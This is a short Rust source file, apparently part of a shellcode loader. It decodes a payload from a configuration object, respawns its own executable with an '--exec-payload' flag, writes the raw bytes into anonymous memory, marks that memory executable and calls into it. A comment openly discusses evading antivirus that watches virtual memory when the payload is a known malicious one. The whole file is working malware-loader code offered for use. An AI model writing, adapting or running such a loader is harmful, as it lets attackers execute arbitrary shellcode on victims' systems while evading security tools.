use std::{env, io, mem, ptr};
use std::error::Error;
use std::process::{Command, Child};

use crate::setting::Setting;

use memmap::MmapMut;

pub fn from_process() -> io::Result<Child> {
    let myself = env::args().nth(0).unwrap();

    Command::new(myself).args(["--exec-payload"]).spawn()
}

pub fn execute(setting: &Setting) -> Result<(), Box<dyn Error>> {
    // ---- IMPORTANT
    //
    // At this point, known malicious payloads might get
    // detected by AVs, if and only if they're watching your
    // virtual memory.
    //
    // So, if you want advanced AV detection, you should change here.
    let raw_payload = setting.decode_payload()?;

    inject_exec(&raw_payload);

    Ok(())
}

pub fn inject_exec(payload: &Vec<u8>) {
    let len = payload.len();

    // writable memory
    let mut w_map = MmapMut::map_anon(len).unwrap();

    unsafe {
        // write shellcode
        ptr::copy(payload.as_ptr(), w_map.as_mut_ptr(), len);

        // transition to readable/executable memory
        let x_map = w_map.make_exec().unwrap();

        let code: extern "C" fn() -> ! = mem::transmute(x_map.as_ptr());
        code();
    };
}
